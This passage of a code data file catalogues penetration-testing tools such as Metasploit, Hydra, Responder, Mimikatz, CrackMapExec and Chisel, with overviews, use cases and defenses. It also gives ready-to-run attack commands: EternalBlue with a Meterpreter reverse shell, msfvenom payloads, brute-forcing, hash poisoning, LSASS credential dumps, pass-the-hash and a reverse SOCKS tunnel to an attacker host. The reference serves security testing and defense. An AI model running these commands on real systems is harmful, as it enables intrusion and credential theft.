    related: ["church-of-malware", "sploitus", "yara"],
  },

  sploitus: {
    overview: [
      "Sploitus aggregates exploit and tool search across Exploit-DB, GitHub, Metasploit, and other sources into one query interface. Filters by type (PoC, remote, local, DoS), platform, and CVE.",
      "Useful for quick PoC discovery during vuln validation—search CVE-YYYY-NNNN and compare multiple public implementations before adapting for authorized tests.",
      "Results link to original hosts; always review code before running. GitHub PoCs may be incomplete, weaponized, or backdoored.",
      "Complements searchsploit CLI (local Exploit-DB mirror) with web UI and broader GitHub indexing.",
    ],
    useCases: [
      "Finding PoCs after CVE disclosure for patch verification",
      "Comparing exploit reliability across multiple public sources",
      "Discovering Metasploit module names for a given CVE",
      "Research on exploitation technique variants",
    ],
    related: ["metasploit", "searchsploit", "nuclei"],
  },

  shannon: {
    overview: [
      "Shannon (KeygraphHQ/shannon) is an open-source white-box web pentester. Given repository access, it maps attack surfaces from source, spins Docker workers for browser and CLI testing, and reports only validated proof-of-concept findings.",
      "Architecture: CLI orchestrates agents that read code (routes, handlers, middleware), generate hypotheses, execute exploits in isolated workers, and deduplicate false positives through re-test. Targets injection, XSS, SSRF, auth, and authorization flaws.",
      "AGPL-licensed CLI; differs from black-box DAST by using code context for smarter payload selection. Air-gapped deployments possible with local model/worker configs depending on setup.",
      "Keygraph commercial platform extends Shannon with continuous runs, CPG-based SAST, and auto-remediation PRs—Shannon is the OSS core.",
    ],
    useCases: [
      "CI-attached white-box pentest on feature branches",
      "Validating fix branches with re-run on same repo commit",
      "Mapping authz gaps from route definitions + live tests",
      "Dockerized exploit confirmation without manual Burp replay",
    ],
    commands: [
      {
        label: "Clone and run (see repo README for current flags)",
        code: "git clone https://github.com/KeygraphHQ/shannon && cd shannon && docker compose up",
      },
    ],
    related: ["keygraph", "burp-suite", "nuclei"],
  },

  keygraph: {
    overview: [
      "Keygraph is KeygraphHQ's commercial application security platform built on Shannon. It combines Code Property Graph static analysis, continuous pentest workers, finding deduplication, and automated remediation pull requests with re-test verification.",
      "Deployment options include SaaS and self-hosted/air-gapped for regulated environments. Findings tie to source locations and validated exploit traces rather than scanner-only pattern matches.",
      "Suited for teams wanting Shannon-style validation at org scale with ticketing integrations and fix workflows—not a replacement for manual red team engagements on non-web attack surfaces.",
    ],
    useCases: [
      "Continuous AppSec on monorepos with high PR velocity",
      "Prioritized fix queues with PoC-backed severity",
      "Air-gapped enterprise code scanning + pentest",
    ],
    related: ["shannon", "burp-suite"],
  },

  // ─── Metasploit expanded ────────────────────────────────────────────

  metasploit: {
    overview: [
      "Metasploit Framework (MSF) is a Ruby-based modular exploitation platform. Rapid7 maintains commercial Metasploit Pro; the open-source Framework drives msfconsole, msfvenom, and thousands of community modules.",
      "Runtime architecture: msfconsole REPL → module loader (mixins for exploit, payload, encoder) → Rex library (network protocol primitives) → optional PostgreSQL db for workspace persistence (hosts, services, creds, loot, sessions).",
      "Typical workflow: `db_nmap` or import → `search type:exploit platform:windows cve:2021` → `use exploit/...` → `set RHOSTS`, `set payload`, `set LHOST` → `check` (if supported) → `run` → `sessions -i` → `run post/multi/recon/...`.",
      "Payload staging: stagers (small bootstrap) pull stage (full payload) over the wire. Meterpreter runs as reflective DLL in memory—avoids disk artifacts but has distinct network/API indicators. Encoders (`-e`) and evasion modules modify delivery; they are not magic AV bypass.",
      "Module search supports grep-like filters: `search type:auxiliary name:smb`, `search cve:2024 rank:excellent`. `info` shows options, references, and compatible payloads. `advanced` and `evasion` tabs expose rarely-needed tuning.",
      "Resource scripts (.rc) automate sequences for CTF and repeat engagements: `msfconsole -r autopwn.rc`. Armitage and RPC API enable GUI and third-party orchestration.",
    ],
    useCases: [
      "Exploit validation for CVEs with configurable targets and badchars",
      "Payload generation via msfvenom for shellcode injection labs",
      "Auxiliary scanning (SMB version, FTP anon, SMTP users) without exploitation",
      "Post-exploitation credential harvest and pivot setup on Meterpreter sessions",
      "Evasion module testing against AMSI/ETW in lab Windows hosts",
    ],
    commands: [
      {
        label: "Initialize database and workspace",
        code: "msfdb init && msfconsole -q -x 'workspace -a engagement; db_nmap -sV 10.0.0.0/24'",
      },
      {
        label: "Search and run exploit",
        code: "search cve:2017-0144 type:exploit\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.0.0.5\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST 10.0.0.100\nrun",
      },
      {
        label: "msfvenom raw shellcode",
        code: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.100 LPORT=4444 -f raw -o shell.bin",
      },
      {
        label: "Handler for reverse payload",
        code: "use exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST 10.0.0.100\nset LPORT 4444\nrun -j",
      },
    ],
    features: [
      "Module types: exploit, auxiliary, payload, encoder, nop, post, evasion",
      "Meterpreter: hashdump, migrate, portfwd, route, kiwi, getsystem",
      "msfvenom: -f formats (exe, elf, ps1, aspx, java), -x template injection",
      "Plugins: db_autopwn, socket_filter, event systems",
      "Integration with Nexpose/Nmap via db_* commands",
    ],
    defense: [
      "Monitor for Metasploit default payloads and certificate patterns",
      "Segment lateral movement; block unexpected SMB/RPC from workstations",
      "EDR signatures on Meterpreter reflective loading and common post modules",
      "Network IDS for EternalBlue, Shellshock, and known exploit traffic",
    ],
    related: ["armitage", "sploitus", "impacket", "cobalt-strike", "searchsploit"],
  },

  // ─── Common Kali tools (rich tier) ────────────────────────────────────

  hydra: {
    overview: [
      "THC-Hydra parallelizes network login brute-force across protocols: SSH, FTP, HTTP(S) forms, SMB, RDP, SQL, SNMP, and many more via module-specific libraries.",
      "Use `-L users.txt -P passes.txt` for combo attacks; `-C` for colon-separated cred pairs. `-t` threads and `-W` wait time tune aggressiveness. HTTP modules need path and form field names (`http-post-form` syntax).",
      "Account lockout policies can brick engagements; prefer password spraying (`-u` single user, large wordlist slowly) on AD environments.",
    ],
    useCases: [
      "Credential stuffing against SSH/FTP with known user lists",
      "HTTP form brute-force on admin login pages",
      "SNMP community string guessing",
      "Spraying one password across many AD accounts",
    ],
    commands: [
      {
        label: "SSH brute-force",
        code: "hydra -L users.txt -P rockyou.txt ssh://10.0.0.50 -t 4 -W 3",
      },
      {
        label: "HTTP POST form",
        code: "hydra -l admin -P passes.txt 10.0.0.50 http-post-form '/login:user=^USER^&pass=^PASS^:F=invalid'",
      },
    ],
    defense: [
      "Rate limiting, CAPTCHA, and lockout after N failures",
      "Monitor distributed failed auth across many accounts (spray detection)",
    ],
    related: ["medusa", "hashcat", "crackmapexec"],
  },

  john: {
    overview: [
      "John the Ripper cracks password hashes offline. Modes: single crack (GECOS/username-based), wordlist, and incremental. `--format` selects hash type (raw-md5, bcrypt, descrypt, krb5tgs).",
      "Use `unshadow` to combine /etc/passwd and /etc/shadow for Linux hash cracking. `--wordlist` with `--rules=Jumbo` applies extensive mangling.",
    ],
    useCases: [
      "Cracking /etc/shadow from compromised Linux hosts",
      "Fast checks against leaked hash formats",
      "Krb5tgs cracking after Kerberoasting",
    ],
    commands: [
      {
        label: "Wordlist with rules",
        code: "john --wordlist=rockyou.txt --rules hashfile.txt",
      },
      {
        label: "Show cracked",
        code: "john --show hashfile.txt",
      },
    ],
    related: ["hashcat", "hydra"],
  },

  responder: {
    overview: [
      "Responder poisons LLMNR, NBT-NS, and mDNS broadcasts on local segments, answering name resolution queries to capture NetNTLMv2 hashes for offline cracking or relay.",
      "Runs HTTP/SMB/MSSQL/FTP/LDAP rogue servers to coerce authentication. `-I eth0` selects interface; `-wrf` enables WPAD and rogue auth servers.",
      "Deadly on flat networks without SMB signing—pair with ntlmrelayx. Disable LLMNR/NBT-NS via GPO in enterprise AD.",
    ],
    useCases: [
      "Capturing hashes from misconfigured Windows name resolution",
      "WPAD poisoning for credential capture",
      "Proof-of-risk for flat network segmentation",
    ],
    commands: [
      {
        label: "Analyze mode (passive, no poison)",
        code: "responder -I eth0 -A",
      },
      {
        label: "Full poison with WPAD",
        code: "responder -I eth0 -wrf",
      },
    ],
    defense: [
      "Disable LLMNR and NBT-NS via GPO",
      "Enable SMB signing; EPA on services",
      "Network segmentation limits broadcast poison scope",
    ],
    related: ["impacket", "crackmapexec", "bettercap"],
  },

  gobuster: {
    overview: [
      "Gobuster brute-forces URIs, DNS subdomains, virtual hosts, and S3 buckets. Modes: dir, dns, vhost, s3, fuzz. Fast Go concurrency with status code filtering.",
      "dir mode: `-w wordlist -u URL -x extensions`. dns mode uses resolver list for subdomain discovery. vhost mode sends Host header fuzzing against IP.",
    ],
    useCases: [
      "Hidden directory and backup file discovery",
      "Subdomain enumeration against authorized domains",
      "Vhost discovery on shared hosting",
    ],
    commands: [
      {
        label: "Directory scan",
        code: "gobuster dir -u https://target.example.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak",
      },
      {
        label: "DNS subdomain",
        code: "gobuster dns -d example.com -w subdomains.txt",
      },
    ],
    related: ["ffuf", "feroxbuster", "dirsearch", "nuclei"],
  },

  ffuf: {
    overview: [
      "ffuf (Fuzz Faster U Fool) is a web fuzzer for directories, parameters, headers, and vhosts. FUZZ keyword marks injection point in URL, POST data, or headers.",
      "Filter by size, words, lines, regex, or status codes to hide noise. `-recursion` for nested discovery; `-rate` limits request speed.",
    ],
    useCases: [
      "Parameter fuzzing for hidden admin functions",
      "Header fuzzing (X-Forwarded-For, Host)",
      "API endpoint discovery",
    ],
    commands: [
      {
        label: "Directory fuzz",
        code: "ffuf -u https://target/FUZZ -w wordlist.txt -fc 404",
      },
      {
        label: "POST JSON fuzz",
        code: "ffuf -u https://target/api -X POST -H 'Content-Type: application/json' -d '{\"id\":\"FUZZ\"}' -w ids.txt",
      },
    ],
    related: ["gobuster", "feroxbuster", "nuclei"],
  },

  feroxbuster: {
    overview: [
      "Feroxbuster is a recursive content discovery tool written in Rust. Auto-calibrates against 404 templates, supports filters, and chains extensions efficiently.",
      "`-u URL -w wordlist --depth 2` recurses discovered paths. `--extract-links` parses HTML for additional targets.",
    ],
    useCases: [
      "Deep recursive web content discovery",
      "Fast scanning with automatic wildcard detection",
    ],
    commands: [
      {
        label: "Recursive scan",
        code: "feroxbuster -u https://target.example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -d 2",
      },
    ],
    related: ["gobuster", "ffuf", "dirsearch"],
  },

  nikto: {
    overview: [
      "Nikto scans web servers for outdated versions, dangerous files, misconfigs, and known CVEs. Signature-based checks over HTTP/S; noisy and comprehensive.",
      "Use `-Tuning` to limit test categories; `-Plugins` for specific checks. `-o` output formats for reporting.",
    ],
    useCases: [
      "Quick web server misconfiguration audit",
      "Finding default files and admin interfaces",
      "SSL/TLS and header misconfiguration checks",
    ],
    commands: [
      {
        label: "Basic scan",
        code: "nikto -h https://target.example.com -o nikto.html -Format html",
      },
    ],
    related: ["nuclei", "burp-suite", "wpscan"],
  },

  theharvester: {
    overview: [
      "theHarvester gathers emails, subdomains, hosts, and URLs from public sources: Search engines, Shodan, crt.sh, Hunter, LinkedIn, etc.",
      "OSINT pre-recon before active scanning. `-b` selects source; `-d` domain. API keys in api-keys.yaml unlock premium sources.",
    ],
    useCases: [
      "Email harvesting for phishing simulations (authorized)",
      "Subdomain discovery from certificate transparency",
      "Passive recon without touching target directly",
    ],
    commands: [
      {
        label: "Multi-source domain harvest",
        code: "theHarvester -d example.com -b google,bing,crtsh -f harvest",
      },
    ],
    related: ["subfinder", "amass", "sherlock", "recon-ng"],
  },

  "recon-ng": {
    overview: [
      "Recon-ng is a modular recon framework with a Metasploit-like CLI. Marketplace installs modules for OSINT (contacts, hosts, breaches).",
      "Workspace model: `workspaces create target`, `modules load`, `options set`, `run`. Results in SQLite DB for export.",
    ],
    useCases: [
      "Structured OSINT workflows with module chaining",
      "Breached credential lookup modules",
      "Domain and contact enumeration",
    ],
    commands: [
      {
        label: "Interactive session",
        code: "recon-ng\n[recon-ng][default] > marketplace install all\n[recon-ng][default] > workspaces create acme",
      },
    ],
    related: ["theharvester", "amass", "subfinder"],
  },

  "aircrack-ng": {
    overview: [
      "aircrack-ng suite covers 802.11 monitoring, capture, and WEP/WPA/WPA2-PSK cracking. Components: airmon-ng, airodump-ng, aireplay-ng, aircrack-ng, airdecap-ng.",
      "WPA crack requires 4-way handshake or PMKID capture. GPU acceleration via hashcat (mode 22000) often replaces aircrack-ng for speed.",
    ],
    useCases: [
      "Wireless passphrase audit on authorized lab APs",
      "Handshake capture for offline cracking",
      "WEP crack demonstrations (legacy)",
    ],
    commands: [
      {
        label: "Monitor mode",
        code: "airmon-ng start wlan0\nairodump-ng wlan0mon -w capture --channel 6",
      },
      {
        label: "Crack WPA handshake",
        code: "aircrack-ng -w wordlist.txt capture-01.cap",
      },
    ],
    related: ["hashcat", "wifite", "bettercap"],
  },

  masscan: {
    overview: [
      "masscan transmits SYN packets at line rate (millions/sec) using raw sockets and its own TCP stack. Stateless—requires separate tools for service ID.",
      "`-p0-65535 10.0.0.0/8 --rate 10000` scans at 10k pps. Output to `-oL` for grep; banner grab with `--banners` (limited).",
      "Firewalls and ISP rate limits often block; coordinate with network owners. Pair with nmap -sV on discovered ports.",
    ],
    useCases: [
      "Internet-scale port discovery",
      "Finding unexpected open ports on large ranges quickly",
      "Research and CDN/shodan-style surveys",
    ],
    commands: [
      {
        label: "Top ports fast scan",
        code: "masscan 10.0.0.0/24 -p1-65535 --rate 5000 -oL masscan.out",
      },
    ],
    defense: [
      "SYN flood detection; rate-based blocking",
      "Minimal external attack surface; close unused ports",
    ],
    related: ["nmap", "nuclei"],
  },

  crackmapexec: {
    overview: [
      "CrackMapExec (CME) is a Swiss-army knife for AD pentesting over SMB, WinRM, LDAP, MSSQL. Modules for enumeration, spraying, execution, and credential testing.",
      "Spray: `cme smb 10.0.0.0/24 -u users.txt -p 'Spring2024!' --continue-on-success`. Exec: `-x whoami` or `-X PowerShell`. `--sam` dumps hashes on admin success.",
      "Successor development continues as NetExec (nxc); Kali may ship both during transition.",
    ],
    useCases: [
      "Password spraying across SMB",
      "Pass-the-hash lateral movement",
      "Share enumeration and spidering",
    ],
    commands: [
      {
        label: "SMB spray",
        code: "crackmapexec smb 10.0.0.0/24 -u users.txt -p 'Password1' --continue-on-success",
      },
      {
        label: "Pass-the-hash exec",
        code: "crackmapexec smb 10.0.0.50 -u administrator -H NTLMhash -x whoami",
      },
    ],
    related: ["netexec", "impacket", "bloodhound", "evil-winrm"],
  },

  netexec: {
    overview: [
      "NetExec (nxc) continues CrackMapExec development. Same protocol coverage with updated modules and improved LDAP/WinRM workflows.",
      "Prefer nxc on new engagements; module syntax similar to CME with naming updates.",
    ],
    useCases: [
      "AD credential validation at scale",
      "Coerced auth and relay prep enumeration",
    ],
    commands: [
      {
        label: "SMB shares enum",
        code: "nxc smb 10.0.0.0/24 --shares -u user -p pass",
      },
    ],
    related: ["crackmapexec", "impacket", "bloodhound"],
  },

  "evil-winrm": {
    overview: [
      "Evil-WinRM provides a WinRM shell with upload/download, Invoke-Binary, and menu for common post-ex on Windows. Uses legitimate WinRM (5985/5986).",
      "`-i IP -u user -p pass` or `-H hash`. Files: `upload`, `download`. Bypasses some SMB-focused detections but WinRM logging applies.",
    ],
    useCases: [
      "Interactive post-ex when WinRM is open and creds available",
      "File transfer without opening new SMB shares",
    ],
    commands: [
      {
        label: "Hash auth shell",
        code: "evil-winrm -i 10.0.0.50 -u administrator -H NTLMhash",
      },
    ],
    related: ["impacket", "crackmapexec", "powershell"],
  },

  mimikatz: {
    overview: [
      "Mimikatz extracts credentials from Windows memory (LSASS): plaintext passwords, NTLM hashes, Kerberos tickets. Also Kerberos attacks (golden ticket, pass-the-key) and token manipulation.",
      "Requires admin + SeDebugPrivilege locally. EDR heavily signatures mimikatz.exe—use alternatives or in-memory techniques in authorized tests.",
    ],
    useCases: [
      "Demonstrating credential exposure from LSASS",
      "Pass-the-hash/ticket after dump",
      "Kerberos ticket extraction for lateral movement",
    ],
    commands: [
      {
        label: "LogonPasswords (classic)",
        code: "mimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords",
      },
    ],
    defense: [
      "Credential Guard, Protected Users, LSA protection",
      "Disable WDigest; restrict admin logon to Tier-0",
    ],
    related: ["impacket", "hashcat", "volatility3"],
  },

  subfinder: {
    overview: [
      "Subfinder passive subdomain enumeration using API aggregators (crt.sh, VirusTotal, Shodan, etc.). Fast, low-noise compared to brute-force DNS.",
      "Configure API keys in provider-config.yaml for deeper results. `-d domain -o out.txt`.",
    ],
    useCases: [
      "Passive subdomain discovery before active recon",
      "Building target lists for nuclei/httpx pipelines—or pipe directly into SIF for combined probe/crawl/nuclei",
    ],
    commands: [
      {
        label: "Enumerate subdomains",
        code: "subfinder -d example.com -all -o subs.txt",
      },
    ],
    related: ["amass", "theharvester", "nuclei", "sif"],
  },

  amass: {
    overview: [
      "OWASP Amass performs in-depth attack surface mapping: passive + active DNS, cert transparency, ASN, and graph output.",
      "Intel/subdomain/brute/viz subcommands. `-active` triggers zone transfers and DNS queries—noisier than subfinder.",
    ],
    useCases: [
      "Comprehensive external ASM on authorized domains",
      "ASN and netblock discovery for org",
    ],
    commands: [
      {
        label: "Passive enum",
        code: "amass enum -passive -d example.com -o amass.txt",
      },
    ],
    related: ["subfinder", "theharvester", "nmap"],
  },

  wpscan: {
    overview: [
      "WPScan enumerates WordPress versions, plugins, themes, users, and known vulnerabilities. Uses API token for vulnerability data.",
      " `--enumerate ap,at,u` for all plugins, themes, users. `--api-token` from wpscan.com.",
    ],
    useCases: [
      "WordPress-specific vuln and config audit",
      "Plugin CVE identification before exploitation",
    ],
    commands: [
      {
        label: "Full enum",
        code: "wpscan --url https://target.example.com -e ap,at,u --api-token TOKEN",
      },
    ],
    related: ["nikto", "nuclei", "sqlmap"],
  },

  dirsearch: {
    overview: [
      "dirsearch is a Python web path scanner. Recursive mode, custom headers, and extension lists. Alternative to gobuster/ffuf with built-in reporting.",
    ],
    useCases: [
      "Path brute-forcing on web apps",
      "API route discovery",
    ],
    commands: [
      {
        label: "Recursive scan",
        code: "dirsearch -u https://target.example.com -e php,html,js -r",
      },
    ],
    related: ["gobuster", "ffuf", "feroxbuster"],
  },

  searchsploit: {
    overview: [
      "searchsploit queries a local Exploit-DB mirror offline. `-m` copies exploit to cwd; `-x` shows examine.",
      "Update with `searchsploit -u`. Useful air-gapped when Sploitus is unreachable.",
    ],
    useCases: [
      "Offline PoC lookup by CVE or product name",
      "Copying exploit code for lab adaptation",
    ],
    commands: [
      {
        label: "Search and examine",
        code: "searchsploit apache 2.4\nsearchsploit -x 41962",
      },
    ],
    related: ["sploitus", "metasploit"],
  },

  binwalk: {
    overview: [
      "binwalk scans firmware for embedded files and filesystems. `-e` extracts; `-M` recurses into extracted content.",
      "Signatures for squashfs, cramfs, u-boot, compressed blobs. Essential for IoT/embedded RE pipeline with ghidra.",
    ],
    useCases: [
      "Firmware extraction from router/IP camera images",
      "Finding hardcoded keys in embedded filesystems",
    ],
    commands: [
      {
        label: "Extract embedded files",
        code: "binwalk -eM firmware.bin",
      },
    ],
    related: ["ghidra", "yara"],
  },

  scapy: {
    overview: [
      "Scapy is a Python packet manipulation library. Craft arbitrary frames, send/receive, sniff, and dissect protocols interactively or scripted.",
      "Used for custom probes, protocol fuzzing, and education. `sr1(IP(dst='10.0.0.1')/TCP(dport=80,flags='S'))` sends SYN and returns first reply.",
    ],
    useCases: [
      "Custom protocol testing and PoC exploit packets",
      "Network discovery scripts without nmap",
      "WiFi/Bluetooth lower-layer research (with appropriate hardware)",
    ],
    commands: [
      {
        label: "Interactive Python",
        code: "python3 -c \"from scapy.all import *; sr1(IP(dst='8.8.8.8')/ICMP())\"",
      },
    ],
    related: ["nmap", "wireshark", "hping3"],
  },

  tcpdump: {
    overview: [
      "tcpdump captures packets with BPF filter syntax. Lightweight CLI alternative to Wireshark for remote servers.",
      "`-i any -w file.pcap 'port 443'`. Read with `-r`. Combine with tshark for analysis.",
    ],
    useCases: [
      "Quick capture on headless Linux during incidents",
      "Validating firewall rules and traffic flow",
    ],
    commands: [
      {
        label: "Capture HTTPS",
        code: "tcpdump -i eth0 -w capture.pcap 'tcp port 443'",
      },
    ],
    related: ["wireshark", "ettercap"],
  },

  ettercap: {
    overview: [
      "Ettercap performs MITM on LAN via ARP poisoning. Sniffs, filters, and injects traffic. Plugins for DNS spoof, credential harvest.",
      "Unified mode `-T` for CLI; `-G` GUI. `--dns` redirects domains. Requires IP forwarding enabled.",
    ],
    useCases: [
      "Demonstrating LAN MITM risk on flat networks",
      "DNS spoofing in authorized lab exercises",
    ],
    commands: [
      {
        label: "ARP poison MITM",
        code: "ettercap -T -M arp:remote /10.0.0.1// /10.0.0.50// -i eth0",
      },
    ],
    defense: [
      "Dynamic ARP inspection on switches; 802.1X",
      "HTTPS everywhere; certificate pinning for sensitive apps",
    ],
    related: ["bettercap", "responder", "wireshark"],
  },

  bettercap: {
    overview: [
      "bettercap is a modern MITM and WiFi attack framework. Modules for ARP/DNS spoof, WiFi recon, BLE, HID, and caplets (scriptable attack chains).",
      "Replaces ettercap for many testers. `net.recon`, `set arp.spoof.targets`, `net.sniff` workflow on wired LAN.",
    ],
    useCases: [
      "Network recon and MITM on authorized segments",
      "WiFi deauth and handshake capture (legal constraints apply)",
    ],
    commands: [
      {
        label: "Interactive caplet",
        code: "bettercap -iface eth0 -eval 'net.recon on; set arp.spoof.targets 10.0.0.50; arp.spoof on; net.sniff on'",
      },
    ],
    related: ["ettercap", "responder", "aircrack-ng"],
  },

  "ligolo-ng": {
    overview: [
      "ligolo-ng tunnels network access through a compromised agent without classic SOCKS. Uses TUN interface on operator side for direct routing into pivot networks.",
      "Agent on target, proxy on attacker; add routes to reach internal subnets through tunnel.",
    ],
    useCases: [
      "Pivoting into internal VLANs during pentests",
      "Avoiding SOCKS-aware tool limitations",
    ],
    commands: [
      {
        label: "Proxy listener",
        code: "ligolo-ng proxy -selfcert",
      },
    ],
    related: ["chisel", "impacket", "metasploit"],
  },

  chisel: {
    overview: [
      "Chisel is a fast TCP/UDP tunnel over HTTP. Single binary client/server for pivot when only 443 egress allowed.",
      "`server -p 8080 --reverse` and client `R:socks` for reverse SOCKS.",
    ],
    useCases: [
      "HTTP-tunneled pivot through restrictive egress",
      "Quick reverse port forward",
    ],
    commands: [
      {
        label: "Reverse SOCKS",
        code: "chisel server -p 8080 --reverse\nchisel client ATTACKER:8080 R:socks",
      },
    ],
    related: ["ligolo-ng", "metasploit"],
  },

  pspy: {
    overview: [
      "pspy monitors process execution without root by polling /proc. Detects cron jobs, short-lived binaries, and admin activity from unprivileged foothold.",
      "`-pf` shows commands without full argv if permissions hide cmdline.",
    ],
    useCases: [
      "Privesc recon on Linux when cron runs root jobs",
      "Observing backup scripts and cleartext creds in commands",
    ],
    commands: [
      {
        label: "Monitor all processes",
        code: "./pspy64 -pf -i 1000",
      },
    ],
    related: ["linpeas", "metasploit"],
  },

  wifite: {
    overview: [
      "Wifite automates wireless auditing: monitor mode, deauth, handshake capture, and crack handoff to aircrack-ng/hashcat.",
      "Runs sequential attacks against visible APs with minimal config.",
    ],
    useCases: [
      "Lab WPA audits with automated workflow",
      "Demonstrating weak PSK risk",
    ],
    commands: [
      {
        label: "Auto attack visible APs",
        code: "wifite --kill",
      },
    ],
    related: ["aircrack-ng", "hashcat", "bettercap"],
  },

  armitage: {
    overview: [
      "Armitage is a GUI front-end for Metasploit team operations. Visual host/network view, exploit launch, and session management.",
      "Team server shares sessions across operators. Less maintained than msfconsole but useful for CTF visualization.",
    ],
    useCases: [
      "Collaborative msfconsole operations with graph view",
      "Training and CTF red team coordination",
    ],
    related: ["metasploit", "cobalt-strike"],
  },

  autopsy: {
    overview: [
      "Autopsy is a GUI digital forensics platform built on The Sleuth Kit. Timeline analysis, keyword search, hash lookup, and ingest modules for disk images.",
      "Used for dead-box forensics vs Volatility memory focus. Supports NTFS, FAT, ext, mobile add-ons.",
    ],
    useCases: [
      "Disk image triage in IR engagements",
      "Timeline correlation of file system events",
      "Keyword and regex search across evidence",
    ],
    related: ["volatility3", "binwalk", "yara"],
  },

  steghide: {
    overview: [
      "steghide embeds/extracts data in JPEG, BMP, WAV, AU using encryption and compression. `-cf file -ef secret.txt -p passphrase`.",
      "Steganalysis tools may detect embedding; not robust against serious analysis.",
    ],
    useCases: [
      "CTF steganography challenges",
      "Demonstrating data exfil via cover media",
    ],
    commands: [
      {
        label: "Extract hidden data",
        code: "steghide extract -sf image.jpg",
      },
    ],
    related: ["binwalk", "yara"],
  },

  medusa: {
    overview: [
      "Medusa parallel network login brute-forcer. Module per protocol similar to Hydra. `-h host -U users -P passes -M ssh`.",
    ],
    useCases: [
      "Alternative to Hydra for multi-protocol spraying",
    ],
    commands: [
      {
        label: "SSH module",
        code: "medusa -h 10.0.0.50 -U users.txt -P passes.txt -M ssh",
      },
    ],
    related: ["hydra", "crackmapexec"],
  },

  hping3: {
    overview: [
      "hping3 crafts ICMP/TCP/UDP packets for firewall testing, traceroute, and idle scan helpers. `--scan` mode for stealth port scan variants.",
    ],
    useCases: [
      "Firewall rule validation",
      "TCP flag scans when nmap unavailable",
    ],
    commands: [
      {
        label: "SYN scan",
        code: "hping3 -S -p 80 -c 1 10.0.0.50",
      },
    ],
    related: ["nmap", "scapy", "masscan"],
  },

  snort: {
    overview: [
      "Snort is a network IDS/IPS with rule-based detection. Snort 3 uses modular inspector architecture; rules from Talos/community.",
      "Deploy inline or passive tap. Signature + preprocessor anomaly detection.",
    ],
    useCases: [
      "Lab IDS tuning and signature development",
      "Detecting exploit attempts and malware C2 patterns",
    ],
    defense: [
      "Keep rules updated; tune false positives per environment",
    ],
    related: ["wireshark", "yara", "nmap"],
  },

  jadx: {
    overview: [
      "JADX decompiles Android DEX/APK to Java source with GUI and CLI. Resource decoding, smali toggle, and search across codebase.",
      "Common first step in mobile app assessments before deeper frida instrumentation.",
    ],
    useCases: [
      "Android app static analysis for secrets and API endpoints",
      "Malware APK triage",
    ],
    commands: [
      {
        label: "Decompile APK",
        code: "jadx -d output/ app.apk",
      },
    ],
    related: ["ghidra", "apktool", "yara"],
  },

  sherlock: {
    overview: [
      "Sherlock hunts usernames across hundreds of social sites. `--site SITE` limits scope; `--csv` for reporting.",
      "OSINT for persona mapping during authorized investigations.",
    ],
    useCases: [
      "Username correlation across platforms",
      "OSINT prep for phishing simulations",
    ],
    commands: [
      {
        label: "Search username",
        code: "sherlock username --csv",
      },
    ],
    related: ["theharvester", "recon-ng"],
  },

  "bloodhound.py": {
    overview: [
      "bloodhound.py is the Python BloodHound ingestor. Collects LDAP/ACE data compatible with BloodHound CE/legacy importers when SharpHound cannot run on target.",
    ],
    useCases: [
      "Linux-based AD collection during engagements",
      "Stealthier DCOnly collection modes",
    ],
    commands: [
      {
        label: "DCOnly collection",
        code: "bloodhound-python -u user -p pass -d corp.local -c DCOnly -ns 10.0.0.1",
      },
    ],
    related: ["bloodhound", "impacket"],
  },

  dsniff: {
    overview: [
      "dsniff suite: arpspoof, dnsspoof, mailsnarf, urlsnarf, passwords from cleartext protocols. Classic LAN sniffing toolkit predating bettercap.",
    ],
    useCases: [
      "Capturing cleartext credentials on switched LANs with MITM",
    ],
    related: ["ettercap", "bettercap", "responder"],
  },

  "beef-xss": {
    overview: [
      "BeEF (Browser Exploitation Framework) hooks browsers via XSS. JavaScript hook.js registers zombie browsers for command modules (cookie theft, port scan, social engineering).",
      "Requires persistent XSS or victim to visit attacker page. Demonstrates browser-as-attack-surface.",
    ],
    useCases: [
      "XSS impact demonstration in web app assessments",
      "Social engineering lab exercises",
    ],
    related: ["burp-suite", "metasploit"],
  },

  "0trace": {
    overview: [
      "0trace performs traceroute using existing TCP connections instead of ICMP/UDP probes. Useful when firewalls block traditional traceroute but established sessions exist.",
    ],
    useCases: [
      "Mapping path through stateful firewalls during post-ex",
    ],
    related: ["nmap", "hping3"],
  },
};
